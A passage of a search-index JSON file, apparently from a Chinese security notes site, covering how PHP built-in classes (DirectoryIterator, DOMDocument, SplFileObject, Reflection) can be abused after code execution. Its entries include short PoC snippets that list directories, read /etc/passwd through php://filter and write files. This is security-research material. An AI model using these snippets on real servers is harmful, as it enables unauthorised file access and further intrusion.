\"a.zip\";","title":"\u6709\u635f\u5199\u6587\u4ef6poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#phar","text":"\u5229\u7528\u811a\u672c: (PHP 5 >= 5.3.0, PHP 7, PECL phar >= 2.0.0)","title":"Phar"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#directory","text":"\u5229\u7528\u7248\u672c\uff1a (PHP 4, PHP 5, PHP 7) \u8fd9\u4e2a\u7c7b\u672c\u610f\u662f\u4e0d\u80fd\u591f\u76f4\u63a5\u901a\u8fc7 new \u65b9\u5f0f\u8fdb\u884c\u521b\u5efa\u5229\u7528\uff0c\u5f53\u4f7f\u7528 dir \u51fd\u6570\u65f6\uff0c\u8fd9\u4e2a\u7c7b\u4f1a\u88ab\u5b9e\u4f8b\u5316\u3002\u4f46\u6211\u4eec\u4f9d\u7136\u53ef\u4ee5\u76f4\u63a5\u5b9e\u4f8b\u5316\u5e76\u4f7f\u7528\u5176\u4e2d\u7684\u65b9\u6cd5","title":"Directory"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u5224\u65ad\u76ee\u5f55\u662f\u5426\u5b58\u5728poc","text":"# \u5224\u65ad\u67d0\u4e2a\u76ee\u5f55\u662f\u5426\u5b58\u5728\uff0c # \u5982\u679c\u5b58\u5728\u8fd4\u56de\u76ee\u5f55\u5b57\u7b26\u4e32\uff0c\u82e5\u4e0d\u5b58\u5728\u5219\u4ea7\u751f\u8b66\u544a\u5e76\u8fd4\u56deNULL $dir=\"/etc\"; echo (new Directory)->read(opendir($dir));","title":"\u5224\u65ad\u76ee\u5f55\u662f\u5426\u5b58\u5728poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u5217\u76ee\u5f55poc","text":"$dir = \"/etc\"; $d = new Directory; $d->resource = opendir($dir); while(($c = $d->read($d->resource))){echo $c.\"\\n\";};","title":"\u5217\u76ee\u5f55poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#directoryiterator","text":"\u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7)","title":"DirectoryIterator"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#poc","text":"# \u7b80\u5355\u5217\u76ee\u5f55 $dir = \"./geek\"; $d = new DirectoryIterator($dir); while ($d->valid()){ echo $d.\"\\n\"; $d->next(); } # \u4e5f\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u6587\u4ef6\u7684\u4fe1\u606f $dir = \"./geek\"; $d = new DirectoryIterator($dir); while($d->valid()){ # \u83b7\u53d6\u6700\u540e\u8bbf\u95ee\u65f6\u95f4 var_dump($d->getATime()); # \u83b7\u53d6\u521b\u5efa\u65f6\u95f4 var_dump($d->getCTime()); # \u83b7\u53d6\u6700\u540e\u4fee\u6539\u65f6\u95f4 var_dump($d->getMtime()); # \u83b7\u53d6\u6587\u4ef6\u540d\uff0c # \u76f4\u63a5\u7528 __toString \u4e5f\u53ef\u4ee5 var_dump($d->getFilename()); var_dump((string)$d); # \u83b7\u53d6\u6587\u4ef6\u540d (\u81ea\u52a8\u9664\u53bb\u540e\u7f00\u540d)\uff0c # \u6bd4\u5982\u9664\u53bb .php \u540e\u7f00\u540d var_dump($d->getBasename(\"php\")); # \u83b7\u53d6\u76ee\u5f55\u548c\u6587\u4ef6\u540d var_dump($d->getPathname()); # \u83b7\u53d6\u6587\u4ef6\u6240\u6709\u8005 var_dump($d->getOwner()); # \u83b7\u53d6\u6587\u4ef6\u6240\u6709\u7ec4 var_dump($d->getGroup()); # \u83b7\u53d6\u6587\u4ef6inode\u7f16\u53f7 var_dump($d->getInode()); # \u83b7\u53d6\u6587\u4ef6\u6743\u9650 var_dump(substr(sprintf(\"%o\",$d->getPerms()),-4)); # \u83b7\u53d6\u6587\u4ef6\u5927\u5c0f var_dump(($d->getSize()/1024).\" kb\"); # \u83b7\u53d6\u6587\u4ef6\u7c7b\u578b (file/dir) var_dump($d->getType()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u76ee\u5f55 var_dump($d->isDir()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u6587\u4ef6 (\u4e0d\u662f\u76ee\u5f55) var_dump($d->isFile()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u4e3a ./.. var_dump($d->isDot()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u6267\u884c var_dump($d->isExecute()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u94fe\u63a5\u6587\u4ef6 var_dump($d->isLink()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u8bfb var_dump($d->isReadable()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u5199 var_dump($d->isWriteable()); $d->next(); } # \u4e00\u4e9b\u5176\u4ed6\u65b9\u6cd5\u7684\u529f\u80fd # \u83b7\u53d6\u5f53\u524d\u76ee\u5f55\u8def\u5f84 (\u5176\u5b9e\u4e5f\u5c31\u662f ? ) var_dump($d->path()); # \u83b7\u53d6\u5f53\u524d\u5143\u7d20\u7684\u7d22\u5f15 var_dump($d->key()); # \u5c06\u5f53\u524d\u7d22\u5f15\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u5143\u7d20 $d->next(); # \u5c06\u7d22\u5f15\u91cd\u7f6e\u5230\u5f00\u5934 $d->rewind(); # \u8bbe\u7f6e\u7d22\u5f15 $d->seek(0); # \u5224\u65ad\u5f53\u524d\u7d22\u5f15\u7684\u6587\u4ef6\u662f\u5426\u5408\u6cd5 (\u662f\u5426\u662f\u4e00\u4e2a\u6587\u4ef6) $d->vaild();","title":"poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#filesystemiterator","text":"\u5229\u7528\u7248\u672c\uff1a (PHP 5 >= 5.3.0, PHP 7) \u5176\u5b9e\u8fd9\u4e2a\u7c7b\u5b9e\u9645\u4e0a\u4e5f\u5c31\u662f DirectoryIterator \u7c7b\u7684\u5347\u7ea7\u7248\uff0c\u57fa\u672c\u7ee7\u627f\u4e86 DirectorIterator \u7c7b\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u6240\u4ee5\u5229\u7528\u65b9\u5f0f\u548c DirectorIterator \u4e00\u6837:","title":"FilesystemIterator"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#poc_1","text":"# \u7b80\u5355\u5217\u76ee\u5f55 $dir = \"./geek\"; $d = new FilesystemIterator($dir); while ($d->valid()){ echo $d.\"\\n\"; $d->next(); } # \u4e5f\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u6587\u4ef6\u7684\u4fe1\u606f $dir = \"./geek\"; $d = new DirectoryIterator($dir); while($d->valid()){ # \u83b7\u53d6\u6700\u540e\u8bbf\u95ee\u65f6\u95f4 var_dump($d->getATime()); # \u83b7\u53d6\u521b\u5efa\u65f6\u95f4 var_dump($d->getCTime()); # \u83b7\u53d6\u6700\u540e\u4fee\u6539\u65f6\u95f4 var_dump($d->getMtime()); # \u83b7\u53d6\u6587\u4ef6\u540d\uff0c # \u76f4\u63a5\u7528 __toString \u4e5f\u53ef\u4ee5 var_dump($d->getFilename()); var_dump((string)$d); # \u83b7\u53d6\u6587\u4ef6\u540d (\u81ea\u52a8\u9664\u53bb\u540e\u7f00\u540d)\uff0c # \u6bd4\u5982\u9664\u53bb .php \u540e\u7f00\u540d var_dump($d->getBasename(\"php\")); # \u83b7\u53d6\u76ee\u5f55\u548c\u6587\u4ef6\u540d var_dump($d->getPathname()); # \u83b7\u53d6\u6587\u4ef6\u6240\u6709\u8005 var_dump($d->getOwner()); # \u83b7\u53d6\u6587\u4ef6\u6240\u6709\u7ec4 var_dump($d->getGroup()); # \u83b7\u53d6\u6587\u4ef6inode\u7f16\u53f7 var_dump($d->getInode()); # \u83b7\u53d6\u6587\u4ef6\u6743\u9650 var_dump(substr(sprintf(\"%o\",$d->getPerms()),-4)); # \u83b7\u53d6\u6587\u4ef6\u5927\u5c0f var_dump(($d->getSize()/1024).\" kb\"); # \u83b7\u53d6\u6587\u4ef6\u7c7b\u578b (file/dir) var_dump($d->getType()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u76ee\u5f55 var_dump($d->isDir()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u6587\u4ef6 (\u4e0d\u662f\u76ee\u5f55) var_dump($d->isFile()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u4e3a ./.. var_dump($d->isDot()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u6267\u884c var_dump($d->isExecute()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u94fe\u63a5\u6587\u4ef6 var_dump($d->isLink()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u8bfb var_dump($d->isReadable()); # \u5224\u65ad\u6587\u4ef6\u662f\u5426\u53ef\u5199 var_dump($d->isWriteable()); $d->next(); } # \u4e00\u4e9b\u5176\u4ed6\u65b9\u6cd5\u7684\u529f\u80fd # \u83b7\u53d6\u5f53\u524d\u76ee\u5f55\u8def\u5f84 (\u5176\u5b9e\u4e5f\u5c31\u662f ? ) var_dump($d->path()); # \u83b7\u53d6\u5f53\u524d\u5143\u7d20\u7684\u7d22\u5f15 var_dump($d->key()); # \u5c06\u5f53\u524d\u7d22\u5f15\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u5143\u7d20 $d->next(); # \u5c06\u7d22\u5f15\u91cd\u7f6e\u5230\u5f00\u5934 $d->rewind(); # \u8bbe\u7f6e\u7d22\u5f15 $d->seek(0); # \u5224\u65ad\u5f53\u524d\u7d22\u5f15\u7684\u6587\u4ef6\u662f\u5426\u5408\u6cd5 (\u662f\u5426\u662f\u4e00\u4e2a\u6587\u4ef6) $d->vaild();","title":"poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#globiterator","text":"\u5229\u7528\u7248\u672c\uff1a (PHP 5 >= 5.3.0, PHP 7)","title":"GlobIterator"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u5217\u76ee\u5f55poc_1","text":"foreach(new GlobIterator(\"./*\") as $f){ echo $f.\"\\n\"; }","title":"\u5217\u76ee\u5f55poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#domdocument","text":"\u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7) \u8fd9\u4e2a\u7c7b\u672c\u610f\u662f\u5904\u7406 XML \u548c HTML \u5185\u5bb9\uff0c\u4e0d\u8fc7\u4e5f\u6709\u76f8\u5e94\u7684\u8bfb/\u5199\u6587\u4ef6\u7684\u65b9\u6cd5\uff0c\u53ea\u8981\u5229\u7528 \u4f2a\u534f\u8bae \u7a0d\u505a\u52a0\u5de5\u5c31\u53ef\u4ee5\u65e0\u6742\u8d28\u5730\u5bf9\u6570\u636e\u8fdb\u884c\u64cd\u4f5c","title":"DOMDocument"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u8bfb\u6587\u4ef6poc_1","text":"# \u8bfb\u6587\u4ef6 # \u5148\u7528 convert.base64 \u5c06\u6587\u4ef6\u5185\u5bb9base64\uff0c\u907f\u514d\u51fa\u73b0\u989d\u5916\u7684 <p> \u6807\u7b7e # \u7136\u540e\u5c06\u8bfb\u53d6\u7684\u5185\u5bb9\u8f6c\u6362\u6210 XML \u683c\u5f0f\uff0c\u518d\u52a0\u8f7d\u5b83\uff0c\u6700\u540e\u53d6 <p> \u6807\u7b7e\u5185\u7684\u5185\u5bb9 (\u5982\u679c\u60f3\u83b7\u53d6\u7eaf\u51c0\u6d41\u5219\u53ef\u4ee5\u518d\u8fdb\u884cbase64\u89e3\u7801) $f=\"/etc/passwd\"; $d=new DOMDocument(); $d->loadHTMLFile(\"php://filter/convert.base64-encode/resource=$f\"); $d->loadXML($d->saveXML()); echo $d->getElementsByTagName(\"p\")[0]->textContent;","title":"\u8bfb\u6587\u4ef6poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u5199\u6587\u4ef6poc","text":"# \u5199\u6587\u4ef6 # \u5148\u7528 string.strip_tags \u5c06\u591a\u4f59\u7684 HTML \u6807\u7b7e\u53bb\u6389\uff0c\u7136\u540e\u518d\u7528 convert.base64 \u5c06\u591a\u4f59\u7684\u5176\u4ed6\u6742\u8d28 (\u5982\u7a7a\u683c\uff0c\u53cc\u5f15\u53f7\u7b49\u975ebase64\u5b57\u7b26\u53bb\u6389) $f=\"./test.php\"; $d=new DOMDocument(); $d->loadHTML(\"dGVzdA==\"); $d->saveHtmlFile(\"php://filter/string.strip_tags|convert.base64-decode/resource=$f\");","title":"\u5199\u6587\u4ef6poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#finfo","text":"\u5229\u7528\u7248\u672c: (PHP >= 5.3.0, PECL fileinfo >= 0.1.0)","title":"finfo"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\u5224\u65ad\u6587\u4ef6\u7c7b\u578bpoc","text":"$f = \"./aasd.php\"; $ff = new finfo(FILEINFO_MIME); echo $ff->file($f);","title":"\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728(\u5224\u65ad\u6587\u4ef6\u7c7b\u578b)poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#splfileobject","text":"SplFileInfo \u7c7b\u4e3a\u5355\u4e2a\u6587\u4ef6\u7684\u4fe1\u606f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9ad8\u7ea7\u7684\u9762\u5411\u5bf9\u8c61\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u7528\u4e8e\u5bf9\u6587\u4ef6\u5185\u5bb9\u7684\u904d\u5386\u3001\u67e5\u627e\u3001\u64cd\u4f5c\u7b49\u3002\u6240\u4ee5\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u7c7b\u4e2d\u7684\u65b9\u6cd5\u4ee3\u66ff\u666e\u901a\u51fd\u6570\u6765\u8bfb\u5199\u6587\u4ef6\u3002","title":"SplFileObject"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u8bfb\u6587\u4ef6poc_2","text":"$context = new SplFileObject('/etc/passwd'); foreach($context as $f){ echo($f); } // \u6216\u8005\u7528\u4f2a\u534f\u8baebase64\u76f4\u63a5\u8f93\u51fa\uff0c\u6709\u65f6\u5019\u6709\u5947\u6548 $context = new SplFileObject('php://filter/read=convert.base64-encode/resource=/etc/passwd'); echo $context;","title":"\u8bfb\u6587\u4ef6poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#\u5199\u6587\u4ef6poc_1","text":"$f = new SplFileObject('./file', \"w\"); $f->fwrite(\"file\");","title":"\u5199\u6587\u4ef6poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#intlchar","text":"\u5229\u7528\u7248\u672c\uff1a (PHP 7, PHP 8, Intl extension)","title":"IntlChar"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#poc_2","text":"\u53ef\u4ee5\u53d6\u4ee3 ord \uff0c chr \u7b49\u51fd\u6570 # ord \u548c chr \u51fd\u6570 IntlChar::ord(\"a\"); IntlChar::chr(97);","title":"poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#reflectionfunction","text":"\u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7)","title":"ReflectionFunction"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#poc_3","text":"\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u53cd\u5c04\u7c7b\u62ff\u5230\u8bb8\u591a\u51fd\u6570\u4e2d\u7684\u4fe1\u606f # \u53cd\u5c04\u8c03\u7528\u51fd\u6570 (new ReflectionFunction(\"func?\"))->invoke(args); (new ReflectionFunction(\"func?\"))->invokeArgs([args1,args2]); # \u83b7\u53d6\u51fd\u6570\u4fe1\u606f (new ReflectionFunction(\"func?\"))->isDisabled() // \u51fd\u6570\u662f\u5426\u53ef\u7528 (new ReflectionFunction(\"func?\"))->getClosure() // \u83b7\u53d6\u8be5\u533f\u540d\u51fd\u6570 (new ReflectionFunction(\"func?\"))->getDocComment() // \u83b7\u53d6\u51fd\u6570\u6ce8\u91ca\u5185\u5bb9 (new ReflectionFunction(\"func?\"))->getStartLine() // \u83b7\u53d6\u51fd\u6570\u5f00\u59cb\u884c\u53f7 (new ReflectionFunction(\"func?\"))->getEndLine() // \u83b7\u53d6\u51fd\u6570\u7ed3\u675f\u884c\u53f7 (new ReflectionFunction(\"func?\"))->getExtensionName() // \u83b7\u53d6\u6269\u5c55\u540d\u79f0 (new ReflectionFunction(\"func?\"))->getName() // \u83b7\u53d6\u51fd\u6570\u540d\u79f0 (new ReflectionFunction(\"func?\"))->getNamespaceName() // \u83b7\u53d6\u547d\u540d\u7a7a\u95f4\u540d\u79f0 (new ReflectionFunction(\"func?\"))->getNumberOfParameters() // \u83b7\u53d6\u51fd\u6570\u53c2\u6570\u6570\u91cf (new ReflectionFunction(\"func?\"))->getNumberOfRequiredParameters() // \u83b7\u53d6\u51fd\u6570\u5fc5\u987b\u4f20\u5165\u7684\u53c2\u6570\u6570\u91cf (new ReflectionFunction(\"func?\"))->getParameters() // \u83b7\u53d6\u51fd\u6570\u53c2\u6570\u540d (new ReflectionFunction(\"func?\"))->getShortName() // \u83b7\u53d6\u51fd\u6570\u77ed\u540d (new ReflectionFunction(\"func?\"))->getStaticVariables() // \u83b7\u53d6\u51fd\u6570\u9759\u6001\u53d8\u91cf (new ReflectionFunction(\"func?\"))->hasReturnType() // \u51fd\u6570\u662f\u5426\u6709\u7279\u5b9a\u8fd4\u56de\u7c7b\u578b (new ReflectionFunction(\"func?\"))->inNamespace() // \u51fd\u6570\u662f\u5426\u5b9a\u4e49\u5728\u547d\u540d\u7a7a\u95f4 (new ReflectionFunction(\"func?\"))->isClosure() // \u51fd\u6570\u662f\u5426\u662f\u533f\u540d\u51fd\u6570 (new ReflectionFunction(\"func?\"))->isDeprecated() // \u51fd\u6570\u662f\u5426\u5f03\u7528 (new ReflectionFunction(\"func?\"))->isGenerator() // \u51fd\u6570\u662f\u5426\u662f\u751f\u6210\u5668\u51fd\u6570 (new ReflectionFunction(\"func?\"))->isInternal() // \u51fd\u6570\u662f\u5426\u662f\u5185\u90e8\u51fd\u6570 (new ReflectionFunction(\"func?\"))->isUserDefined() // \u51fd\u6570\u662f\u5426\u662f\u7528\u6237\u5b9a\u4e49","title":"poc"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#reflectionmethod","text":"\u5229\u7528\u7248\u672c\uff1a (PHP 5, PHP 7)","title":"ReflectionMethod"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/#poc_4","text":"\u5229\u7528\u529f\u80fd\uff1a - \u8bbe\u7f6e\u7c7b\u4e2d\u79c1\u6709/\u53d7\u4fdd\u62a4\u662f\u5426\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee - \u901a\u8fc7\u53cd\u5c04\u8c03\u7528\u65b9\u6cd5 - \u83b7\u53d6\u65b9\u6cd5\u4fe1\u606f # \u53cd\u5c04\u8c03\u7528\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->invoke(new [class?]/NULL(\u9759\u6001\u7c7b),args1,args2); (new ReflectionMethod(\"class?\",\"method?\"))->invokeArgs(new [class?]/NULL(\u9759\u6001\u7c7b,[args1,args2])); # \u8bbe\u7f6e\u79c1\u6709/\u53d7\u4fdd\u62a4\u65b9\u6cd5 $f = new ReflectionMethod(\"class?\",\"method?\"); $f->setAccessible(true); $f->invoke(new [class?]); (new [class?])->[method?](); // \u4f1a\u62a5\u9519 # \u83b7\u53d6\u51fd\u6570\u4fe1\u606f (new ReflectionMethod(\"class?\",\"method?\"))->getDeclaringClass() // \u83b7\u53d6\u53cd\u5c04\u65b9\u6cd5\u7684\u7c7b\u4f5c\u4e3a\u53cd\u5c04\u7c7b\u8fd4\u56de (new ReflectionMethod(\"class?\",\"method?\"))->isAbstract() // \u65b9\u6cd5\u662f\u5426\u662f\u62bd\u8c61\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->isConstructor() // \u65b9\u6cd5\u662f\u5426\u662f __construct (new ReflectionMethod(\"class?\",\"method?\"))->isDestructor() // \u65b9\u6cd5\u662f\u5426\u662f __destruct (new ReflectionMethod(\"class?\",\"method?\"))->isFinal() // \u65b9\u6cd5\u662f\u5426\u5b9a\u4e49\u4e86final (new ReflectionMethod(\"class?\",\"method?\"))->isPrivate() // \u65b9\u6cd5\u662f\u5426\u662f\u79c1\u6709\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->isProtected() // \u65b9\u6cd5\u662f\u5426\u662f\u53d7\u4fdd\u62a4\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->isPublic() // \u65b9\u6cd5\u662f\u5426\u662f\u516c\u6709\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->isStatic() // \u65b9\u6cd5\u662f\u5426\u662f\u9759\u6001\u65b9\u6cd5 (new ReflectionMethod(\"class?\",\"method?\"))->getDocComment() // \u83b7\u53d6\u65b9\u6cd5\u6ce8\u91ca\u5185\u5bb9 (new ReflectionMethod(\"class?\",\"method?\"))->getStartLine() // \u83b7\u53d6\u65b9\u6cd5\u5f00\u59cb\u884c\u53f7 (new ReflectionMethod(\"class?\",\"method?\"))->getEndLine() // \u83b7\u53d6\u65b9\u6cd5\u7ed3\u675f\u884c\u53f7 (new ReflectionMethod(\"class?\",\"method?\"))->getExtensionName() // \u83b7\u53d6\u6269\u5c55\u540d\u79f0 (new ReflectionMethod(\"class?\",\"method?\"))->getName() // \u83b7\u53d6\u65b9\u6cd5\u540d\u79f0 (new ReflectionMethod(\"class?\",\"method?\"))->getNamespaceName() // \u83b7\u53d6\u547d\u540d\u7a7a\u95f4\u540d\u79f0 (new ReflectionMethod(\"class?\",\"method?\"))->getNumberOfParameters() // \u83b7\u53d6\u65b9\u6cd5\u53c2\u6570\u6570\u91cf (new ReflectionMethod(\"class?\",\"method?\"))->getNumberOfRequiredParameters() // \u83b7\u53d6\u65b9\u6cd5\u5fc5\u987b\u4f20\u5165\u7684\u53c2\u6570\u6570\u91cf (new ReflectionMethod(\"class?\",\"method?\"))->getParameters() // \u83b7\u53d6\u65b9\u6cd5\u53c2\u6570\u540d (new ReflectionMethod(\"class?\",\"method?\"))->getShortName() // \u83b7\u53d6\u65b9\u6cd5\u77ed\u540d (new ReflectionMethod(\"class?\",\"method?\"))->getStaticVariables() // \u83b7\u53d6\u65b9\u6cd5\u9759\u6001\u53d8\u91cf (new ReflectionMethod(\"class?\",\"method?\"))->hasReturnType() // \u65b9\u6cd5\u662f\u5426\u6709\u7279\u5b9a\u8fd4\u56de\u7c7b\u578b (new ReflectionMethod(\"class?\",\"method?\"))->inNamespace() // \u65b9\u6cd5\u662f\u5426\u5b9a\u4e49\u5728\u547d\u540d\u7a7a\u95f4 (new ReflectionMethod(\"class?\",\"method?\"))->isClosure() // 